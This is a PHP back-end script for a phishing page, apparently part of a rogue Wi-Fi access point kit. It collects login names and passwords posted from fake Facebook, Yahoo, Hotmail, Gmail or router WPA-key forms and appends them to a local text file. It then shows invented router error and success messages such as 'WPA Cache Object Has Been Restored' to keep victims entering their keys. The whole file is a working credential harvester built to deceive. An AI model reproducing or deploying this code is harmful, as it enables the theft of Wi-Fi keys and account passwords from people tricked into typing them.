<?php
//Copyright 2012 VulpiArgenti
//Thanks to devi1 for help recoding this

$name = $_POST['login'];
$password = $_POST['password'];

if($_POST['facebook']){
	$service = "facebook";
}elseif($_POST['yahoo']){
	$service = "yahoo";
}elseif($_POST['hotmail']){
	$service = "hotmail";
}elseif($_POST['gmail']){
	$service = "gmail";
}

$accinfo = "login: $name\npass: $password\nservice: $service\n-----\n";

$fp = fopen("/var/www/routerwpa6/formdata.txt", "a");
fwrite($fp, $accinfo);
fclose($fp);

sleep(1);

$error =
"<html>\n" .
"<head>\n" .
"<meta http-equiv=\"Refresh\" content=\"5;url=/\" />\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Incorrect Data Entry.</p1></center>\n" .
"<center><p1><b>Complete Both Data Fields Before Continuing.</b></p1></center>\n" .
"<center><p1></p1></center>\n" .
"</body>\n" .
"</html>";

$errorequal =
"<html>\n" .
"<head>\n" .
"<meta http-equiv=\"Refresh\" content=\"5;url=/\" />\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Incorrect Data Entry.</p1></center>\n" .
"<center><p1><b>WPA Keys Entered Do Not Match Try Again.</b></p1></center>\n" .
"<center><p1></p1></center>\n" .
"</body>\n" .
"</html>";

$errorlength =
"<html>\n" .
"<head>\n" .
"<meta http-equiv=\"Refresh\" content=\"5;url=/\" />\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>Incorrect Data Entry.</p1></center>\n" .
"<center><p1><b>WPA Key Must Be 8 to 63 Characters In Length.</b></p1></center>\n" .
"<center><p1></p1></center>\n" .
"</body>\n" .
"</html>";

$success=
"<html>\n" .
"<head>\n" .
"</head>\n" .
"<body>\n" .
"<center><p1>The WPA Cache Object Has Been Restored.</p1></center>\n" .
"<center><p1><b>Reset Router Before Continuing.</b></p1></center>\n" .
"</body>\n" .
"</html>";

if(($password == "") || ($name == "")) {
    echo $error;  // if credentials not entered

}elseif($password != $name) {
    echo $errorequal;  //if keys not equal


}elseif((strlen($name) < 8  || strlen($name) > 63)) {
	echo $errorlength;  //key wrong length

}else{ echo $success;
}

//uncomment to debug $_POST variable:
//print_r($_POST);

//uncomment to list name, password, and service variables:
//echo('$name: ' . $name . '<br>$password: ' . $password . '<br>$service: ' . $service);

?>
